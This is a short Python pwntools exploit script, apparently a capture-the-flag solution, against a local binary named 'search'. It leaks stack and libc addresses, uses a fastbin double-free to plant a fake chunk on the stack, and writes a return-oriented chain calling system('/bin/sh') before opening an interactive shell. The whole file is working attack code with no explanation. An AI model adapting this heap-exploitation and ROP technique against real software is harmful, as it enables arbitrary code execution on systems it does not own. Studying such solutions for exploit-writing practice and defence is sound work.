# http://nextline.tistory.com/109
from pwn import *

s = process('./search')

pop_rdi = 0x400e23

def send_msg(msg):
	s.recvuntil('t\n')
	s.sendline(msg)

def stack_leak():
	s.recvuntil('t\n')
	s.sendline('A')
	s.recvline()

	s.sendline('A' * 48)
	return (u64(s.recvline()[48:56]) & 0x0000ffffffffffff)

def libc_leak():
	s.sendline('2')
	s.sendline('512')
	s.sendline('A' * 510 + ' B')

	send_msg('1')
	s.sendline('1')
	s.sendline('B')
	s.sendline('y')

	send_msg('1')
	s.sendline('1')
	s.recv(1024)
	s.sendline('\x00')
	s.recvuntil(': ')
	libc_leak_add = u64(s.recv(8)) - 0x3c3b78
	s.sendline('n')
	return libc_leak_add

def Exploit(stack_leak, libc_leak):
	# A_chunk
	send_msg('2')
	s.sendline('56')
	s.sendline('A' * 54 + ' D')

	# B_chunk
	send_msg('2')
	s.sendline('56')
	s.sendline('B' * 54 + ' D')

	# C_chunk
	send_msg('2')
	s.sendline('56')
	s.sendline('C' * 54 + ' D')

	# remove all
	send_msg('1')
	s.sendline('1')
	s.sendline('D')

	s.sendline('y')
	s.sendline('y')
	s.sendline('y')

	#fastbin : HEAD -> a -> b -> c -> NULL
	#double free bug
	send_msg('1')
	s.sendline('1')
	s.sendline('\x00')

	s.sendline('y')
	s.sendline('n')
	s.sendline('n')

	#fastbin : HEAD -> b -> a -> b -> ..
	send_msg('2')
	s.sendline('56')
	s.sendline((p64(int(stack_leak) + 0x52)).ljust(56))

	send_msg('2')
	s.sendline('56')
	s.sendline('A' * 56)

	send_msg('2')
	s.sendline('56')
	s.sendline('A' * 56)

	send_msg('2')
	s.sendline('56')
	payload = 'B' * 6 + p64(pop_rdi)
	payload += p64(libc_leak + 0x18c177) + p64(libc_leak + 0x45390)
	s.sendline(payload.ljust(56))

	s.sendline('3')
	s.recv(1024)
	print '[+] GET SHELL!'
	s.interactive()

def main():
	s = stack_leak()
	print '[+] STACK LEAK : ' + hex(s)
	l = libc_leak()
	print '[+] LIBC LEAK : ' + hex(l)
	Exploit(s,l)

if __name__ == "__main__" :
	main()
